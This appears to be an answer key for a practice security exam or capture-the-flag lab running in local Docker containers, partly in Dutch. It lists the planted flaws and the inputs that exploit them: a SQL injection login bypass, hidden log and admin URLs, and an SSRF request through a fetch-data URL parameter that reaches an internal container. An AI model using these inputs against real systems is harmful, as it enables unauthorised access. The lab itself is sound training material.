# Solutions

## vulns
- hidden endpoints with log and admin interface
- SQL injection
- comment in source code
- SSRF bij search field

## how to find
```
inspect op hoofdpagina voor comment
```

```
http://localhost:8080/logs
```

```
http://localhost:8080/administrator
enable admin
' or true;#
```

```
Tip: 1 van de flaggen draait onder http://oefentoets-frontend-1:8002 maar is extern niet beschikbaar:
http://oefentoets-frontend-1:8002
details request in shop aanpassen:
http://localhost:5050/fetch-data?url=http://oefentoets-frontend-1:8002
```


## debugging
when Docker is stuck:
```
docker-compose down -v 
docker volume prune -f 
docker-compose up --build
```

evtl met container connecten:  
docker exec -it oefentoets-frontend-1 /bin/sh